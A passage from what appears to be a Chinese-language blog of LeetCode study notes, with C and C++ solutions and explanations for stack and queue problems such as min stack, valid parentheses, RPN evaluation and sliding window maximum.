class="params">(Stack* obj, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    obj-&gt;stk[obj-&gt;stkSize++] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackPop</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    obj-&gt;stkSize--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stackTop</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;stk[obj-&gt;stkSize - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">stackEmpty</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;stkSize == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackFree</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;stk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Stack* inStack;</span><br><span class="line">    Stack* outStack;</span><br><span class="line">&#125; MyQueue;</span><br><span class="line"></span><br><span class="line"><span class="function">MyQueue* <span class="title">myQueueCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyQueue* ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyQueue));</span><br><span class="line">    ret-&gt;inStack = stackCreate(<span class="number">100</span>);</span><br><span class="line">    ret-&gt;outStack = stackCreate(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in2out</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!stackEmpty(obj-&gt;inStack)) &#123;</span><br><span class="line">        stackPush(obj-&gt;outStack, stackTop(obj-&gt;inStack));</span><br><span class="line">        stackPop(obj-&gt;inStack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueuePush</span><span class="params">(MyQueue* obj, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    stackPush(obj-&gt;inStack, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePop</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stackEmpty(obj-&gt;outStack)) &#123;</span><br><span class="line">        in2out(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x = stackTop(obj-&gt;outStack);</span><br><span class="line">    stackPop(obj-&gt;outStack);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePeek</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stackEmpty(obj-&gt;outStack)) &#123;</span><br><span class="line">        in2out(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stackTop(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myQueueEmpty</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stackEmpty(obj-&gt;inStack) &amp;&amp; stackEmpty(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueueFree</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    stackFree(obj-&gt;inStack);</span><br><span class="line">    stackFree(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225 用队列实现栈"></a>225 用队列实现栈</h3><p>仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p>
<p>实现 MyStack 类：</p>
<pre><code>void push(int x) 将元素 x 压入栈顶。
int pop() 移除并返回栈顶元素。
int top() 返回栈顶元素。
boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。
</code></pre>
<ul>
<li>你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。</li>
</ul>
<p><strong>法一：两个队列，其中一个用于 作备份使用</strong></p>
<p><strong>分析：</strong></p>
<ul>
<li>队列是先进先出的规则，把一个队列中的数据导入另一个队列中，数据的顺序并没有变，并没有变成先进后出的顺序。</li>
<li>但是依然还是要用两个队列来模拟栈，只不过没有输入和输出的关系，而是<strong>另一个队列完全用来备份的</strong>！</li>
<li>用两个队列que1和que2实现队列的功能，que2其实完全就是一个备份的作用，把que1<strong>最后面的元素</strong>(准备输出)以外的元素都备份到que2，然后弹出最后面的元素，再把其他元素从que2导回que1。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  【两个队列】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que1;</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que2;<span class="comment">//备份</span></span><br><span class="line">    <span class="built_in">MyStack</span>()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        que1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = que1.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//留下一个元素在que1中，需要输出的元素</span></span><br><span class="line">        <span class="keyword">while</span>(len)&#123;<span class="comment">//备份至que2 </span></span><br><span class="line">            que2.<span class="built_in">push</span>(que1.<span class="built_in">front</span>());</span><br><span class="line">            que1.<span class="built_in">pop</span>();</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = que1.<span class="built_in">front</span>();</span><br><span class="line">        que1.<span class="built_in">pop</span>();</span><br><span class="line">        que1 = que2;<span class="comment">//还原</span></span><br><span class="line">        <span class="keyword">while</span>(!que2.<span class="built_in">empty</span>())</span><br><span class="line">            que2.<span class="built_in">pop</span>();<span class="comment">//清空本轮 备份队列 que2</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que1.<span class="built_in">back</span>();<span class="comment">//栈 的top就是 队列 的 最后一个元素 back</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que1.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    【一个队列】：一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外）重新添加到队列尾部，此时再去弹出元素就是栈的顺序了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyStack</span>()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        que.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = que.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(len)&#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>());</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">back</span>();<span class="comment">//栈 的top就是 队列 的 最后一个元素 back</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title="155 最小栈"></a>155 最小栈</h3>设计一个支持 push ，pop ，top 操作<br>【在常数时间内检索到最小元素的栈】</li>
</ul>
<p>实现 MinStack 类:</p>
<pre><code>MinStack() 初始化堆栈对象。
void push(int val) 将元素val推入堆栈。
void pop() 删除堆栈顶部的元素。
int top() 获取堆栈顶部的元素。
int getMin() 获取堆栈中的最小元素。
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    辅助栈</span></span><br><span class="line"><span class="comment">按照上面的思路，我们只需要设计一个数据结构，使得每个元素 a 与其相应的最小值 m 时刻保持一一对应。因此我们可以使用一个辅助栈，与元素栈同步插入与删除，用于【存储与每个元素对应的最小值】。</span></span><br><span class="line"><span class="comment">    当一个元素要入栈时，我们取当前辅助栈的栈顶存储的最小值，与当前元素比较得出最小值，将这个最小值插入辅助栈中；</span></span><br><span class="line"><span class="comment">    当一个元素要出栈时，我们把辅助栈的栈顶元素也一并弹出；</span></span><br><span class="line"><span class="comment">    【任意一个时刻，栈内元素的最小值就存储在辅助栈的栈顶元素中】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> &#123;</span></span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; x_stack;</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; min_stack;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">        min_stack.<span class="built_in">push</span>(INT_MAX);<span class="comment">//初始为最大值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        x_stack.<span class="built_in">push</span>(val);</span><br><span class="line">        min_stack.<span class="built_in">push</span>(<span class="built_in">min</span>(min_stack.<span class="built_in">top</span>(),val));<span class="comment">//重点，将当前栈中最小的元素存于min_stack栈中</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        x_stack.<span class="built_in">pop</span>();</span><br><span class="line">        min_stack.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x_stack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min_stack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20 有效的括号"></a>20 有效的括号</h3><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<pre><code>左括号必须用相同类型的右括号闭合。
左括号必须以正确的顺序闭合。
每个右括号都有一个对应的相同类型的左括号。
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//unordered_map&lt;char,char&gt; pairs=&#123;&#125;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果长度是奇数，则一定不闭合</span></span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">char</span>&gt; pairs=&#123;</span><br><span class="line">            &#123;<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>&#125;,<span class="comment">//key value</span></span><br><span class="line">            &#123;<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;[&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pairs.<span class="built_in">count</span>(ch))&#123;<span class="comment">//如果栈顶是右括号，则查找匹配</span></span><br><span class="line">                <span class="keyword">if</span>(stk.<span class="built_in">empty</span>() || stk.<span class="built_in">top</span>() != pairs[ch])<span class="comment">//不匹配</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//匹配，弹出</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果 栈顶左括号，直接入栈</span></span><br><span class="line">                stk.<span class="built_in">push</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1047-删除字符串中的所有相邻重复项"><a href="#1047-删除字符串中的所有相邻重复项" class="headerlink" title="1047 删除字符串中的所有相邻重复项"></a>1047 删除字符串中的所有相邻重复项</h3><p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。<br>在 S 上<strong>反复执行</strong>重复项删除操作，直到无法继续删除。<br><strong>注意：消除之后又有新的元素可能挨在一起</strong><br>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p>
<p>示例：<br>输入：”abbaca”<br>输出：”ca”</p>
<p><strong>分析：</strong><br>本题要删除相邻相同元素，相对于<code>20. 有效的括号</code>来说其实也是匹配问题，之前是匹配左右括号，本题是<strong>匹配相邻元素</strong>，最后都是做消除的操作。<br>栈的目的，就是存放遍历过的元素，当遍历当前的这个元素的时候，去栈里看一下我们是不是遍历过相同数值的相邻元素。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    栈：push()  pop()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeDuplicates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">char</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.<span class="built_in">empty</span>() || stk.<span class="built_in">top</span>()!=c)</span><br><span class="line">                stk.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//当前遍历元素 等于 栈顶部元素，则需要消除</span></span><br><span class="line">        &#125;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            res += stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());<span class="comment">//逆序一下</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    直接使用字符串的 push_back() 和 pop_back()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeDuplicates</span><span class="params">(string S)</span> </span>&#123;</span><br><span class="line">        string result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> s : S) &#123;</span><br><span class="line">            <span class="keyword">if</span>(result.<span class="built_in">empty</span>() || result.<span class="built_in">back</span>()!=s) &#123;</span><br><span class="line">                result.<span class="built_in">push_back</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150 逆波兰表达式求值"></a>150 逆波兰表达式求值</h3><p>给你一个字符串数组 tokens ，表示一个根据 逆波兰表示法 表示的算术表达式。<br>计算该表达式。返回一个表示表达式值的整数。<br><strong>【后缀表达式】对计算机来说是非常友好的</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    只用一个栈：存操作数</span></span><br><span class="line"><span class="comment">    只用按照正常的顺序遍历，当遇到符号时就 弹出数字栈的两个元素进行操作即可</span></span><br><span class="line"><span class="comment">    tokens = [&quot;2&quot;,&quot;1&quot;,&quot;+&quot;,&quot;3&quot;,&quot;*&quot;]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; stk_nums;<span class="comment">//注意：long long</span></span><br><span class="line">        <span class="comment">//数字转字符串：to_string()</span></span><br><span class="line">        <span class="comment">//字符串转数字：stoi()、stol()、stof()、stod()等等</span></span><br><span class="line">        <span class="keyword">for</span>(string c:tokens)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&quot;+&quot;</span> || c==<span class="string">&quot;-&quot;</span> || c==<span class="string">&quot;*&quot;</span> || c==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> a = stk_nums.<span class="built_in">top</span>();</span><br><span class="line">                stk_nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> b = stk_nums.<span class="built_in">top</span>();</span><br><span class="line">                stk_nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> res;</span><br><span class="line">                <span class="built_in"><span class="keyword">switch</span></span>(c[<span class="number">0</span>])&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                        res = b * a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                        res = b / a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                        res = b + a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                        res = b - a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stk_nums.<span class="built_in">push</span>(res);<span class="comment">//结果入栈</span></span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                stk_nums.<span class="built_in">push</span>(<span class="built_in">stoll</span>(c));<span class="comment">//入数字</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk_nums.<span class="built_in">top</span>();<span class="comment">//最终结果在栈顶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="239-滑动窗口最大值——（deque双端队列【自定义-单调队列】-priority-queue大顶堆）"><a href="#239-滑动窗口最大值——（deque双端队列【自定义-单调队列】-priority-queue大顶堆）" class="headerlink" title="239 滑动窗口最大值——（deque双端队列【自定义 单调队列】/priority_queue大顶堆）"></a>239 滑动窗口最大值——（deque双端队列【自定义 单调队列】/priority_queue大顶堆）</h3><p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。<br>滑动窗口每次只向右移动一位，返回【滑动窗口中的最大值】。<br><img src="https://img-blog.csdnimg.cn/378f7a45e94d421593d273882dea54a2.png"><br><strong>法一：priority_queue&lt;pair&lt;int,int&gt;&gt; q;</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; q;<span class="comment">//值，下标</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)<span class="comment">//前 k 个元素放入优先队列</span></span><br><span class="line">            q.<span class="built_in">emplace</span>(nums[i],i);<span class="comment">//入大根堆</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res = &#123;q.<span class="built_in">top</span>().first&#125;;<span class="comment">//前三个元素的最大值已存入</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;n;i++)&#123;</span><br><span class="line">            q.<span class="built_in">emplace</span>(nums[i],i);</span><br><span class="line">            <span class="keyword">while</span>(q.<span class="built_in">top</span>().second &lt;= i-k)</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(q.<span class="built_in">top</span>().first);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>法二：使用deque实现 自定义的单调队列</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> &#123;</span> <span class="comment">//单调队列（从大到小）</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        deque&lt;<span class="keyword">int</span>&gt; que; <span class="comment">// 使用deque来实现单调队列</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!que.<span class="built_in">empty</span>() &amp;&amp; value == que.<span class="built_in">front</span>()) &#123;<span class="comment">//出口值 即 最大值</span></span><br><span class="line">                que.<span class="built_in">pop_front</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// push：存 最大值</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (!que.<span class="built_in">empty</span>() &amp;&amp; value&gt;que.<span class="built_in">back</span>())&#123;</span><br><span class="line">                que.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            que.<span class="built_in">push_back</span>(value);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询当前队列里的最大值</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> que.<span class="built_in">front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        MyQueue que;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++) &#123; <span class="comment">// 先将前k的元素放进队列</span></span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最大值在 front处</span></span><br><span class="line">        result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>()); <span class="comment">// result记录前k的元素的最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=k; i&lt;nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            que.<span class="built_in">pop</span>(nums[i-k]); <span class="comment">// 滑动窗口移除最前面元素</span></span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]); <span class="comment">// 滑动窗口前加入最后面的元素</span></span><br><span class="line">            result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>()); <span class="comment">// 记录对应的最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="347-前-K-个高频元素——小顶堆-大顶堆（用到了-priority-queue【定义-小顶堆】）"><a href="#347-前-K-个高频元素——小顶堆-大顶堆（用到了-priority-queue【定义-小顶堆】）" class="headerlink" title="347 前 K 个高频元素——小顶堆/大顶堆（用到了 priority_queue【定义-小顶堆】）"></a>347 前 K 个高频元素——小顶堆/大顶堆（用到了 priority_queue【定义-小顶堆】）</h3><p>给你一个整数数组 nums 和一个整数 k ，请你返回其中 <strong>出现频率</strong> <strong>前k高的元素</strong>。你可以按 任意顺序 返回答案。<br>示例 1:<br>输入: nums = [1,1,1,2,2,3], k = 2<br>输出: [1,2]</p>
<p><strong>只用维护 k 个元素的集合（按照频率排序）——&gt; 大顶堆、小顶堆</strong></p>
